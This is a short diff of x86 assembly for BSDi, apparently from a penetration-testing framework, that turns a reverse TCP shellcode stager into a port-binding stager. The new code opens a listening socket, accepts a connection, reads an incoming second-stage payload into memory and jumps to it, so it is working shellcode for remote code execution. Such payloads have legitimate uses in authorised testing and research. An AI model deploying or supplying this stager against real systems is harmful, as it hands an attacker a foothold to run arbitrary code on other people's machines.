@@ -1,6 +1,6 @@
 ;;
 ; 
-;        Name: stager_sock_reverse
+;        Name: stager_sock_bind
 ;   Qualities: Can Have Nulls
 ;   Platforms: BSDi
 ;     Authors: skape <mmiller [at] hick.org>
@@ -14,7 +14,7 @@
 ;
 ; Description:
 ;
-;        Implementation of a BSDi reverse TCP stager.
+;        Implementation of a BSDi portbind TCP stager.
 ;
 ;        File descriptor in edi.
 ;
@@ -25,40 +25,52 @@ GLOBAL _start
 _start:
 
 initialization:
-	push 0xc3000700
+	push dword 0xc3000700
 	mov  eax, 0x9a
 	cdq
 	push eax
 	mov  esi, esp
 
 socket:
-	push edx
-	inc  edx
-	push edx
-	inc  edx
-	push edx
-	push byte 0x61
-	pop  eax
+	xor  eax, eax
+	push eax
+	inc  eax
+	push eax
+	inc  eax
+	push eax
+	mov  al, 0x61
 	call esi
-	xchg eax, edi
 
-connect:
-	push dword 0x0100007f
+bind:
+	push edx
 	push dword 0xbfbf0210
 	mov  ebx, esp
 	push byte 0x10
 	push ebx
-	push edi
-	push byte 0x62
+	push eax
+	push byte 0x68
 	pop  eax
 	call esi
 
+listen:
+	mov  al, 0x6a
+	call esi
+
+accept:
+	pop  ecx
+	push edx
+	push edx
+	push ecx
+	mov  al, 0x1e
+	call esi
+	xchg eax, edi
+
 read:
-	mov  al, 0x3
+	push byte 0x3
+	pop  eax
 	mov  dh, 0xc
 	push edx
-	push esp
+	push ebx
 	push edi
 	call esi
-	pop  edi
-	ret
+	jmp  ebx
